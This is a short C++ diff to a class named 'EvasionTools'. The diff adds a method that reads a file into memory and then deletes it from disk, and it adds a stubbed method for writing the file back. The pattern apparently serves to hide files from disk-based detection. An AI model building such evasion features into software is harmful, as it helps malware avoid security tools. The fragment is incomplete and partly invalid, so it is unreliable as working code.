@@ -1,5 +1,6 @@
 class EvasionTools{
 	private:
+		int			    fd;
 		int 			 tmpi1;
 		int			 tmpi2;
 		char*                tmpc=NULL;
@@ -25,6 +26,22 @@ class EvasionTools{
 				return 1;
 
 			strncpy(Current.name, newpath, 255);
+			return 0;
+		}
+		int MoveIntoMemory(){
+			fd=open(Current.name, O_RDONLY);
+
+			if (fd == -1 || tmpc != NULL)
+				return 1;
+
+			tmpc=(char*)malloc(Current.size);
+			read(fd, tmpc, Current.size);
+
+			if (remove(Current.name))
+				return 1;
+			return 0;
+		}
+		int MoveBackToDisk(const char* loc=Current.name){
 			return 0;
 		}
 };
